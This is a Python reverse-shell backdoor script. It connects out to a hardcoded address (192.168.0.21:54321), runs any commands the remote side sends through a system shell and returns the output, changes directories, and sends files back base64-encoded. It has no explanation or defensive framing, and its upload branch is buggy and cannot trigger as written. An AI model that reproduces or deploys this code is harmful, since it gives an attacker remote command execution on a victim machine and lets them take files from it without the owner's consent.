#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64

def relibale_send(data):
	try:
		json_data = json.dumps(data.decode('utf-8'))
		sock.send(bytes(json_data, 'utf-8'))
	except Exception as e:
		print("Exception hile sending message")
		print(e)

def reliable_recv():
	data = ""
	while True:
		try :
			data = data + str(sock.recv(1024).decode("utf-8"))
			return json.loads(data)
		except ValueError:
			continue


def shell():
	while True:
		command = reliable_recv()
		if command == 'q':
			break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				relibale_send(base64.b64encode(file.read()))
		elif command[:8] == "upload":
			try:
				with open(command[7:], "wb") as fin:
					file_data = reliable_recv()
					file.write(base64.b64decode(file_data))
			except Exception as e: 
				print(e)

		
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				relibale_send(result)
			except Exception as e:
				print(e)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.0.21", 54321))
shell()
sock.close()


